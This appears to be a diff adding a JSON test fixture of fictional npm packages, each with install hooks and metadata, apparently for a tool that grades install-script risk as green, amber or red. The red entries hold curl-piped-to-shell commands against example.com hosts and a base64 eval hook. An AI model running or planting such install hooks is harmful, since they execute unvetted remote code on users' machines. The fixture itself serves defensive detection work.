@@ -1,0 +1,167 @@
+[
+  {
+    "name": "hermetic-green-native-build",
+    "rank": 1,
+    "monthly_downloads": 5000000,
+    "version": "1.0.0",
+    "scripts": { "postinstall": "node-gyp rebuild" },
+    "publish_age_hours": 8760,
+    "attestation_present": false
+  },
+  {
+    "name": "hermetic-green-noop",
+    "rank": 2,
+    "monthly_downloads": 4000000,
+    "version": "1.0.0",
+    "scripts": { "postinstall": "exit 0" },
+    "publish_age_hours": 8760,
+    "attestation_present": false
+  },
+  {
+    "name": "hermetic-green-softfail-wrapper",
+    "rank": 3,
+    "monthly_downloads": 3500000,
+    "version": "1.0.0",
+    "scripts": { "postinstall": "node -e \"try{require('./postinstall')}catch(e){}\"" },
+    "publish_age_hours": 8760,
+    "attestation_present": true
+  },
+  {
+    "name": "hermetic-green-bare-node-gyp-build",
+    "rank": 4,
+    "monthly_downloads": 3000000,
+    "version": "1.0.0",
+    "scripts": { "install": "node-gyp-build" },
+    "publish_age_hours": 8760,
+    "attestation_present": false
+  },
+  {
+    "name": "hermetic-amber-binary-fetcher",
+    "rank": 5,
+    "monthly_downloads": 2500000,
+    "version": "1.0.0",
+    "scripts": { "postinstall": "node install.js" },
+    "publish_age_hours": 8760,
+    "attestation_present": false,
+    "repository": "git+https://github.com/hermetic-org/hermetic-amber-binary-fetcher.git",
+    "referenced_scripts": [
+      {
+        "filename": "install.js",
+        "content": "const https = require('https');\nconst fs = require('fs');\nconst path = require('path');\nconst pkg = require('./package.json');\n\nconst platform = process.platform;\nconst arch = process.arch;\nconst url = `https://github.com/hermetic-org/hermetic-amber-binary-fetcher/releases/download/v${pkg.version}/binary-${platform}-${arch}.tar.gz`;\nconst dest = path.join(__dirname, 'bin', `binary-${platform}-${arch}.tar.gz`);\n\nfs.mkdirSync(path.dirname(dest), { recursive: true });\nhttps.get(url, (res) => {\n  res.pipe(fs.createWriteStream(dest));\n});\n"
+      }
+    ]
+  },
+  {
+    "name": "hermetic-amber-binary-fetcher-recent",
+    "rank": 6,
+    "monthly_downloads": 2300000,
+    "version": "1.0.0",
+    "scripts": { "postinstall": "node install.js" },
+    "publish_age_hours": 1,
+    "attestation_present": false,
+    "repository": "git+https://github.com/hermetic-org/hermetic-amber-binary-fetcher-recent.git"
+  },
+  {
+    "name": "hermetic-amber-prebuild-fallback",
+    "rank": 7,
+    "monthly_downloads": 2000000,
+    "version": "1.0.0",
+    "scripts": { "install": "prebuild-install || node-gyp rebuild" },
+    "publish_age_hours": 8760,
+    "attestation_present": false,
+    "repository": "git+https://github.com/hermetic-org/hermetic-amber-prebuild-fallback.git"
+  },
+  {
+    "name": "hermetic-amber-node-helper-script",
+    "rank": 8,
+    "monthly_downloads": 1800000,
+    "version": "1.0.0",
+    "scripts": { "postinstall": "node ./scripts/setup.js" },
+    "publish_age_hours": 8760,
+    "attestation_present": false,
+    "repository": "git+https://github.com/hermetic-org/hermetic-amber-node-helper-script.git"
+  },
+  {
+    "name": "hermetic-amber-compound-other",
+    "rank": 9,
+    "monthly_downloads": 1500000,
+    "version": "1.0.0",
+    "scripts": { "postinstall": "node ./scripts/setup.js && echo done" },
+    "publish_age_hours": 8760,
+    "attestation_present": false
+  },
+  {
+    "name": "hermetic-amber-telemetry",
+    "rank": 10,
+    "monthly_downloads": 1300000,
+    "version": "1.0.0",
+    "scripts": { "postinstall": "next telemetry disable" },
+    "publish_age_hours": 8760,
+    "attestation_present": false
+  },
+  {
+    "name": "hermetic-red-curl-sh",
+    "rank": 11,
+    "monthly_downloads": 1000000,
+    "version": "1.0.0",
+    "scripts": { "postinstall": "curl https://install.example.com/script.sh | sh" },
+    "publish_age_hours": 8760,
+    "attestation_present": false
+  },
+  {
+    "name": "hermetic-red-curl-bash",
+    "rank": 12,
+    "monthly_downloads": 900000,
+    "version": "1.0.0",
+    "scripts": { "preinstall": "curl -fsSL https://example.com/bootstrap.sh | bash" },
+    "publish_age_hours": 8760,
+    "attestation_present": false
+  },
+  {
+    "name": "hermetic-red-eval-base64",
+    "rank": 13,
+    "monthly_downloads": 800000,
+    "version": "1.0.0",
+    "scripts": { "postinstall": "node -e \"eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString())\"" },
+    "publish_age_hours": 8760,
+    "attestation_present": false
+  },
+  {
+    "name": "hermetic-no-scripts",
+    "rank": 14,
+    "monthly_downloads": 700000,
+    "version": "1.0.0",
+    "scripts": {},
+    "publish_age_hours": 8760,
+    "attestation_present": false
+  },
+  {
+    "name": "hermetic-multiphase-worst-of",
+    "rank": 15,
+    "monthly_downloads": 650000,
+    "version": "1.0.0",
+    "scripts": {
+      "preinstall": "tsc",
+      "postinstall": "node install.js"
+    },
+    "publish_age_hours": 8760,
+    "attestation_present": false,
+    "repository": "git+https://github.com/hermetic-org/hermetic-multiphase-worst-of.git",
+    "referenced_scripts": [
+      {
+        "filename": "install.js",
+        "content": "const https = require('https');\nconst fs = require('fs');\nconst path = require('path');\n\n// Fetches a prebuilt native binding from the package's own GitHub Releases.\nconst pkg = require('./package.json');\nconst url = `https://github.com/hermetic-org/hermetic-multiphase-worst-of/releases/download/v${pkg.version}/binding-${process.platform}-${process.arch}.node`;\nconst dest = path.join(__dirname, 'build', 'Release', 'binding.node');\nfs.mkdirSync(path.dirname(dest), { recursive: true });\nhttps.get(url, (res) => res.pipe(fs.createWriteStream(dest)));\n"
+      }
+    ]
+  },
+  {
+    "name": "hermetic-amber-llm-with-attestation",
+    "rank": 16,
+    "monthly_downloads": 600000,
+    "version": "1.0.0",
+    "scripts": { "postinstall": "node ./vendor/build.js --target=release" },
+    "publish_age_hours": 8760,
+    "attestation_present": true,
+    "repository": "git+https://github.com/hermetic-org/hermetic-amber-llm-with-attestation.git"
+  }
+]
